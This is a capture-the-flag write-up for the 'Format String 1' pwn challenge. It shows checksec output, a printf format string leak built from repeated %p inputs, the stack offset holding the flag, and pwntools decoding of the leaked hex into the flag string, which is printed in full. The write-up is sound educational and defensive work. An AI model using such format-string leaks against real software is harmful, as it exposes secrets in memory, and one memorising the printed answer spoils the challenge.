## CTF: picoCTF 2024

Challenge: Format String 1

Points:15

Category: pwn

Difficulty: Intermediate

## Instructions

Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!

## Solution

This challenge takes us through the most basic format string vulnerability to work us up to the other challenges. It's important to understand before you get to more advanced attacks, so lets walk through it.

So we start with a binary called *format-string-1.* It's important to check to see what kind of file it is and what protections it has before we start doing anything else to it.

```bash
└─$ file format-string-1
format-string-1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0db53838d4fb91afc72fb5ef54784f256d129f24, for GNU/Linux 3.2.0, not stripped

┌──(shinigami㉿shinigami)-[~/DrBrown]
└─$ checksec format-string-1
[*] '/home/shinigami/DrBrown/format-string-1'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

We can see it is a 64-bit executable, it's not stripped, and PIE is no enabled. For this specific challenge it is not terribly important, but it's always good practice to look at. We then try to run the binary, and we get told that three files are not available, secret-menu-item-1, secret-menu-item-2, and flag.txt. Simply make all these files so that when the program tries to run, it can find these files and not crash. Now that it's running, we can see the behavior of the program. It simply takes our input and prints it back out to us like so.

```bash
─$ ./format-string-1
Give me your order and I'll read it back to you:
aaa
Here's your order: aaa
Bye!
```

Whenever you see our input getting printed back to you, you know immediately that you should try to see if there is a format string vulnerability. A format string vulnerability is essentially when the developer does not check the input from the user and prints it back out for the user to see. If you give printf format strings without any variables, it will try to find values to print. It'll first read from registers based on the calling conventions, and then start reading off the stack. This could allows us to leak certain addresses, or in this case, some secrets. Lets put this into radare2 and see if we can see what it is doing under the hood.

We can see that in radare2, it is opening the file and then using fgets to write it on to the stack

![image.png](assets/images/writeups/format-string-1/image.png)

This tells us that it is possible to potentially leak this secret off the stack and retrieve the flag. We will simply have to fuzz the input to see where our secret is and then slowly close our window to where we can find our secret. Lets try to leak some secrets. We'll start with 30 %p's to get a lot of values, and then try to look for a hash that looks like our local flag "my_flag" or hex 0x6d795f666c6167.

```bash
└─$ ./format-string-1
Give me your order and I'll read it back to you:
%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p
Here's your order: 0x7ffe21ccb960|(nil)|(nil)|(nil)|0x7fd4990e9ee0|0x7fd49914992e|(nil)|0x7fd499154da0|0x5475103d|0x7fd49911e498|0x7fd49912898a|0x10|0x7fd49911e8a0|0xa67616c665f796d|0x7ffe21ccbb00|0x7ffe21ccbbd4|0x7fd49911c340|0x7fd499148bd5|(nil)|0x7ffe21ccbcb0|0x7ffe21ccbd00|0x7ffe21ccbca8|0x7ffe21ccbbd4|0x7fd49911e4f8|0x7fd4991146e0|0x3|0x7fd49912934b|0x1|0x7ffe21ccbd10|0x70257c70257c7025
Bye!
```

I usually count to find where my secret is before I try to close the window. When I counted, I found a bunch of hex that looked similar to mine at position 14. Lets print it out and see.

```bash
Give me your order and I'll read it back to you:
%14$p
Here's your order: 0xa67616c665f796d
Bye!
```

That is our flag, but the endianess is swapped. The easiest way to fix this would be to just pass it to pwn_tools p64 function to get it correct.

```bash
>>> print(p64(0xa67616c665f796d))
b'my_flag\n'
```

This is great, we now know where the flag at least starts, so we can now connect to the remote server and get the flag.

Here's how to get the final string.

```bash
>>> print(p64(0x7b796d6564616361))
b'academy{'
>>> newstring = ""
>>> newstring = b""
>>> newstring += p64(0x7b796d6564616361))
  File "<python-input-8>", line 1
    newstring += p64(0x7b796d6564616361))
                                        ^
SyntaxError: unmatched ')'
>>> newstring += p64(0x7b796d6564616361)
>>> print(p64(0x355f31346d316e34))
b'4n1m41_5'
>>> newstring += p64(0x355f31346d316e34)
>>> print(p64(0x3478345f33317937))
b'7y13_4x4'
>>> newstring += p64(0x3478345f33317937)
>>> print(p64(0x31395f673431665f))
b'_f14g_91'
>>> newstring += p64(0x31395f673431665f)
>>> print(p64(0x7d646539656166))
b'fae9ed}\x00'
>>> newstring += p64(0x7d646539656166)
>>> print(newstring)
b'academy{4n1m41_57y13_4x4_f14g_91fae9ed}\x00'
```

## Flag

```bash
academy{4n1m41_57y13_4x4_f14g_91fae9ed}
```

## Mitigation

Don't have a format string vulnerability by taking the users input directly. Sanitize and check for size properly.